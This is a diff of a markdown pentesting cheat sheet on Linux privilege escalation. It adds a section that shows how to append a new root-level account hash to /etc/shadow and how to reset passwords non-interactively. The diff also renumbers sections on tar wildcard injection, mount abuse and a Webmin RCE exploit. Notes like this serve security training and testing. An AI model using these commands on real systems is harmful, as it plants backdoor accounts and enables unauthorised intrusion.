@@ -2,7 +2,7 @@
 title: Linux Privilege Escalation
 desc: 
 tags: [Cron, Linux, Mount, PrivEsc, Privilege, RCE, Reverse, Shell, Vim]
-alts: [DNS-Pentesting, Docker-Pentesting, Privilege-Escalation-Windows]
+alts: [DNS-Pentesting, Docker-Pentesting, Reverse-Shell, Windows-Priviles-Escalation]
 render_with_liquid: false
 ---
 
@@ -44,9 +44,9 @@ render_with_liquid: false
     echo $PATH
 
     # Positional arguments
-    $0
-    $1
-    $2
+    echo $0
+    echo $1
+    echo $2
     ```
 
 2. **User's Privileges and Commands**
@@ -450,7 +450,46 @@ render_with_liquid: false
 
 <br />
 
-## 3. LXC/LXD
+## 3. Update Sensitive Information
+
+1. **Change Password of Current User**
+
+    You need to know the current user's password.
+
+    ```sh
+    echo -n '<current-password>\n<new-password>\n<new-password>' | passwd
+    ```
+
+2. **Add Another Root User to /etc/shadow**
+
+    1. **Generate New Password**
+
+        ```sh
+        # -6: SHA512
+        openssl passwd -6 -salt salt password
+        ```
+
+        Copy the output hash.
+
+    2. **Add New Line to /etc/shadow in Target Machine**
+
+        You need to do as root privileges.
+
+        ```sh
+        echo '<new-user-name>:<generated-password-hash>:19115:0:99999:7:::' >> /etc/shadow
+        ```
+
+    3. **Switch to New User**
+
+        To confirm, switch to generated new user.
+
+        ```sh
+        su <new-user>
+        ```
+
+<br />
+
+## 4. LXC/LXD
 
 LXD is a container management extension for Linux Containers (LXC).
 
@@ -509,7 +548,7 @@ LXD is a container management extension for Linux Containers (LXC).
 
 <br />
 
-## 4. Wildcard Injection with Tar
+## 5. Wildcard Injection with Tar
 
 ```sh
 # Check if there are 'tar' command and wildcard(*) in the sudoers
@@ -541,7 +580,7 @@ whoami
 
 <br />
 
-## 5. Mount Folders
+## 6. Mount Folders
 
 First of all, show mount info.
 
@@ -582,7 +621,7 @@ showmount -e <target-ip>
 
 <br />
 
-## 6. Display the Content of Files You Don't Have Permissions
+## 7. Display the Content of Files You Don't Have Permissions
 
 Using **"more"** command.
 
@@ -607,7 +646,7 @@ Using **"more"** command.
 
 <br />
 
-## 7. Webmin <= 1.920 Remote Code Execution
+## 8. Webmin <= 1.920 Remote Code Execution
 
     ```sh
     git clone https://github.com/MuirlandOracle/CVE-2019-15107
